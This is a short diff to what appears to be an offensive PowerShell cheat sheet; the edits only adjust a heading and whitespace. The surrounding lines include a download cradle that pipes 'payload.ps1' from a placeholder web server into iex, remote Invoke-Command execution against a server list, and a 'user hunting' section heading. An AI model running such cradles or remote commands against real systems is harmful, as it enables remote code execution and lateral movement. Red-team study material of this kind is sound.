@@ -35,7 +35,8 @@ Execution Cradle
 iex (New-Object Net.WebClient).DownloadString('https://webserver/payload.ps1')
 ```
 
-Invoke Command
+### Invoke Command
+
 Use below to execute commands or scriptblocks:
 ```powershell
 Invoke-Command –Scriptblock {Get-Process} -ComputerName (Get-Content <list_of_servers>)
@@ -60,7 +61,7 @@ Use below to execute "Stateful" commands using Invoke-Command:
 ```powershell
 $Sess = New-PSSession –Computername Server1
 Invoke-Command –Session $Sess –ScriptBlock {$Proc = GetProcess}
- Invoke-Command –Session $Sess –ScriptBlock {$Proc.Name}
+Invoke-Command –Session $Sess –ScriptBlock {$Proc.Name}
 ```
 ## Technique (user hunting)
 ```powershell
